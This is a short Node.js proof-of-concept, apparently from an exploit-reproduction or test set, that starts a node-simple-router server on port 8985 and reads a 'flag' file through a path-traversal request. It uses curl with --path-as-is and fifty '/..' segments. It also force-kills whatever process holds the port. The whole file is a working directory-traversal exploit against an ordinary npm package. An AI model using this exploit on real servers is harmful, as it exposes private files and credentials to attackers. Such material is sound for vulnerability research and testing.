function exploitFunction({ pathToFlag }) {
    const Router = require("node-simple-router");
    const http = require("http");
    const fs = require("fs");
    const { exec } = require("child_process");

    let hostsFile = fs.readFileSync(pathToFlag).toString();

    try {
        exec("fuser -k 8985/tcp", () => {});
    } catch (e) {}

    let router = new Router({
        static_route: process.cwd(),
        cgi_dir: "cgi-bin",
        use_nsr_session: false,
        default_home: [],
    });

    const server = http.createServer(router);
    server.listen(8985);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8985${"/..".repeat(50) + pathToFlag}"`;
    exec(attack_string, (error, stdout) => {
        console.log(stdout); // For demonstration purposes, replace with actual verification logic
    });
}

module.exports = { exploitFunction };